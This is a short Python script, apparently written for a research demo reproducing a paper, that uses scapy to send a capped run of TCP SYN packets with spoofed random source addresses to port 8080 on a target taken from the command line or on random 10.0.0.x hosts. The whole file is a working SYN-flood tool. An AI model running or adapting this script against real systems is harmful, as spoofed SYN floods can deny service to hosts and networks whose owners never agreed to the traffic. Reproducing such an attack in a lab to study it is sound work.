#!/usr/bin/python

import logging
from random import randint
from time import sleep

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

MAX_SYNS = 3 * 254


def send_syn(dst):
    i = IP()
    # i.src = "%i.%i.%i.%i" % (randint(1, 254), randint(1, 254), randint(1, 254), randint(1, 254))
    i.src = "192.168.1.%i" % randint(1, 254)  # to make it a bit faster for the demo

    if dst is not None:
        i.dst = dst
    else:
        i.dst = "10.0.0.%i" % randint(1, 254)  # random destination as described in the paper

    t = TCP()
    t.sport = randint(1, 65535)
    t.dport = 8080
    t.flags = 'S'

    send(i / t, verbose=0)


if __name__ == "__main__":
    target = None
    if len(sys.argv) == 2:
        target = sys.argv[1]

    print("Synflood Started!")

    count = 0
    while count < MAX_SYNS:
        count += 1

        try:
            send_syn(target)
        except Exception as ex:
            print(ex)

        sleep(1.0 / (254.0 / 30.0))

    print("Synflood Finished!")
